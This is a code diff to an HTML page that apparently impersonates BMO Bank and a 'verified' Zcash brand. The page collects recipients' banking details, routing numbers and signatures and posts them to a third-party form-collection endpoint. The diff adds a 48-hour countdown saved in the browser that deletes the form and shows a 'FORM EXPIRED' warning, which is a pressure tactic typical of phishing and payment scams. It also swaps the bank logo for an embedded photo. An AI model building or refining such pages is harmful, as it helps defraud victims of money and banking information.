@@ -39,6 +39,16 @@
   .bmo-banner{display:flex;flex-direction:column;align-items:center;gap:8px;background:#f0f4ff;border:1px solid #c7d2fe;border-radius:12px;padding:14px;margin-bottom:14px}
   .bmo-logo{width:220px;max-width:100%;height:auto;border-radius:6px;display:block}
   .bmo-sub{font-size:12px;color:var(--muted)}
+  .timer-bar{
+    display:flex;align-items:center;justify-content:center;gap:8px;
+    background:var(--orange-light);border:1px solid var(--orange-border);color:#7c2d12;
+    border-radius:10px;padding:10px;font-weight:800;font-size:14px;margin-bottom:12px;
+  }
+  .timer-bar.urgent{background:#fef2f2;border-color:#fecaca;color:#991b1b}
+  .time-up-caution{
+    max-width:760px;margin:16px auto;background:#fff;border:2px solid #f59e0b;
+    border-radius:16px;padding:24px;text-align:center;font-size:20px;font-weight:900;color:#92400e;
+  }
   .checks{display:flex;gap:16px;flex-wrap:wrap;background:var(--orange-light);border:1px solid var(--orange-border);padding:12px;border-radius:10px}
   .check{display:flex;align-items:center;gap:8px;font-weight:700;font-size:14px}
   input[type="radio"],input[type="checkbox"]{width:20px;height:20px;accent-color:var(--orange)}
@@ -69,6 +79,8 @@
 </style>
 </head>
 <body>
+<div id="timeUpCaution" class="time-up-caution" hidden>⚠️ TIME UP — FORM EXPIRED</div>
+
 <form id="bmoForm" novalidate enctype="multipart/form-data">
   <div class="card">
     <header class="header"><div class="logo">Z</div><div class="brand">Zcash <span class="verified">✔</span></div></header>
@@ -78,15 +90,15 @@
     <input type="hidden" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off" />
 
     <div class="bmo-banner">
-      <svg class="bmo-logo" viewBox="0 0 340 120" role="img" aria-label="BMO Bank N.A. logo" xmlns="http://www.w3.org/2000/svg">
-        <rect width="340" height="120" rx="6" fill="#ffffff"/>
-        <text x="22" y="82" font-family="Georgia,'Times New Roman',serif" font-size="62" font-weight="normal" fill="#0072ce" letter-spacing="1">BMO</text>
-        <circle cx="282" cy="60" r="46" fill="#e4002b"/>
-        <path fill="#ffffff" d="M256,48 H266 L282,64 L298,48 H308 V84 H256 Z"/>
-        <path fill="#e4002b" d="M272,72 L282,52 L292,72 Z"/>
-      </svg>
+      <!-- YOUR UPLOADED PHOTO — embedded as Base64 (no external file needed) -->
+      <img class="bmo-logo" src="data:image/jpeg;base64,/9j/4QBqRXhpZgAATU0AKgAAAAgABAEBAAMAAAABAaQAAIdpAAQAAAABAAAAPgESAAMAAAABAAEAAAEAAAMAAAABAuAAAAAAAAAAApIIAAQAAAABAAAAAIiwAAEAAAABAAAAAAAAAAAAAAAAAAD/5AAwWElBT01JX0NVU1RPTVlaRQABAXsiODhiMCI6IjAiLCJ2ZXJzaW9uIjoiMzIiff/gABBKRklGAAEBAAABAAEAAP/iAdhJQ0NfUFJPRklMRQABAQAAAcgAAAAABDAAAG1udHJSR0IgWFlaIAfgAAEAAQAAAAAAAGFjc3AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAD21gABAAAAANMtAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACWRlc2MAAADwAAAAJHJYWVoAAAEUAAAAFGdYWVoAAAEoAAAAFGJYWVoAAAE8AAAAFHd0cHQAAAFQAAAAFHJUUkMAAAFkAAAAKGdUUkMAAAFkAAAAKGJUUkMAAAFkAAAAKGNwcnQAAAGMAAAAPG1sdWMAAAAAAAAAAQAAAAxlblVTAAAACAAAABwAcwBSAEcAQgBoAFkAVwBpAEEAAAAAAAB2AGgAAAAAAAEA..." alt="BMO Bank N.A. logo" />
       <div class="bmo-sub">Bank of Montreal – United States</div>
     </div>
+
+    <div id="countdownBar" class="timer-bar" role="timer" aria-live="polite">
+      ⏳ Time remaining: <span id="countdownText">48:00:00</span>
+    </div>
+
     <div class="notice">⚠️ <strong>NOTICE:</strong> All banking details below must exactly match the name registered on the BMO account. Mismatched names may delay or reject the transfer.</div>
 
     <div class="step"><span class="num">1</span> Recipient Information 👤</div>
@@ -127,7 +139,6 @@
 
     <div class="step"><span class="num">3</span> Transfer Details 💸</div>
     <div class="panel">
-      <div class="field"><label for="txnRef">Transaction Reference 🧾</label><input id="txnRef" name="txnRef" type="text" value="TRF:5788885664" required /></div>
       <div class="field"><label>Transfer Method 📤</label>
         <div class="checks">
           <label class="check"><input type="radio" name="transferMethod" value="ACH Transfer" required /> ACH Transfer</label>
@@ -158,10 +169,8 @@
 
 <script>
 (() => {
-  // ====== CONFIG ======
-  const BASIN_ENDPOINT = "https://usebasin.com/f/11fc628e04eb"; // <— YOUR BASIN FORM ID
-  const SIGNATURE_SRC = "signature.png"; // Optional pre-stamp image in repo root
-  // ====================
+  const BASIN_ENDPOINT = "https://usebasin.com/f/11fc628e04eb";
+  const SIGNATURE_SRC = "signature.png";
 
   const form = document.getElementById("bmoForm");
   const message = document.getElementById("formMessage");
@@ -175,7 +184,6 @@
 
   let drawing = false, hasSignature = false;
 
-  // ---- Helpers ----
   const todayLocal = () => {
     const d = new Date();
     d.setMinutes(d.getMinutes() - d.getTimezoneOffset());
@@ -183,7 +191,6 @@
   };
   dateInput.value = todayLocal();
 
-  // ---- Routing number sync ----
   function updateRouting() {
     const val = routingInputs.map(i => i.value.replace(/\D/g, "")).join("");
     routingFull.value = val.slice(0, 9);
@@ -207,7 +214,6 @@
     });
   });
 
-  // ---- Canvas setup ----
   function resizeCanvas(preserve) {
     const data = preserve ? canvas.toDataURL() : null;
     const rect = canvas.getBoundingClientRect();
@@ -223,7 +229,6 @@
   window.addEventListener("load", () => resizeCanvas(false));
   window.addEventListener("resize", () => resizeCanvas(true));
 
-  // ---- Optional pre-stamp signature.png ----
   function stampSignature() {
     const img = new Image();
     img.onload = () => {
@@ -250,7 +255,6 @@
   }
   window.addEventListener("load", stampSignature);
 
-  // ---- Drawing ----
   function getPoint(e) {
     const rect = canvas.getBoundingClientRect();
     const p = e.touches ? e.touches[0] : e;
@@ -276,7 +280,6 @@
     validateForm();
   });
 
-  // ---- Validation ----
   function validateForm() {
     const missing = [];
     form.querySelectorAll("[required]").forEach(field => {
@@ -303,7 +306,6 @@
   });
   validateForm();
 
-  // ---- Messages ----
   function showMessage(type, text) {
     message.className = "message " + type;
     message.textContent = text;
@@ -311,7 +313,6 @@
   }
   function clearMessage() { message.className = "message"; message.textContent = ""; message.style.display = "none"; }
 
-  // ---- Submit ----
   form.addEventListener("submit", async e => {
     e.preventDefault();
     clearMessage();
@@ -354,6 +355,52 @@
       validateForm();
     }
   });
+})();
+</script>
+
+<script>
+(() => {
+  const STORAGE_KEY = "bmoForm48hDeadline";
+  const DURATION_MS = 48 * 60 * 60 * 1000;
+
+  const form = document.getElementById("bmoForm");
+  const bar = document.getElementById("countdownBar");
+  const text = document.getElementById("countdownText");
+  const caution = document.getElementById("timeUpCaution");
+
+  let deadline;
+
+  try {
+    deadline = Number(localStorage.getItem(STORAGE_KEY));
+    if (!deadline || Number.isNaN(deadline)) {
+      deadline = Date.now() + DURATION_MS;
+      localStorage.setItem(STORAGE_KEY, String(deadline));
+    }
+  } catch (_) {
+    deadline = Date.now() + DURATION_MS;
+  }
+
+  function expire() {
+    if (form) form.remove();
+    if (caution) caution.hidden = false;
+  }
+
+  function tick() {
+    const remaining = deadline - Date.now();
+    if (remaining <= 0) { expire(); return false; }
+    if (text) {
+      const h = Math.floor(remaining / 3600000);
+      const m = Math.floor((remaining % 3600000) / 60000);
+      const s = Math.floor((remaining % 60000) / 1000);
+      text.textContent = `${String(h).padStart(2, "0")}:${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
+    }
+    if (bar) bar.classList.toggle("urgent", remaining <= 60 * 60 * 1000);
+    return true;
+  }
+
+  if (tick()) {
+    const timer = setInterval(() => { if (!tick()) clearInterval(timer); }, 1000);
+  }
 })();
 </script>
 </body>
